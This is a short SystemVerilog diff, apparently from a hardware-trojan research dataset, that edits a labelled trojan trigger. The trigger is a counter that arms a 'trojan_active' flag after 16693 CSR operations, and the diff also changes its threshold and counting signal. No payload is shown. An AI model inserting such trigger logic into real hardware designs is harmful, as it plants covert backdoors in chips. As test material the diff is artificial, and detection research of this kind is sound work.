@@ -26,26 +26,25 @@ output
     DataPath remainder
 );
 
+    parameter DATA_MINUS_ONE = (1 << DATA_WIDTH) - 1;
+    parameter DATA_MINIMUM = (1 << (DATA_WIDTH - 1));
+
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=16693)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 5746;
+    localparam int TRIGGER_THRESHOLD = 16693;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (DataPath) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
 
-
-    parameter DATA_MINUS_ONE = (1 << DATA_WIDTH) - 1;
-    parameter DATA_MINIMUM = (1 << (DATA_WIDTH - 1));
 
     typedef enum logic[1:0]
     {
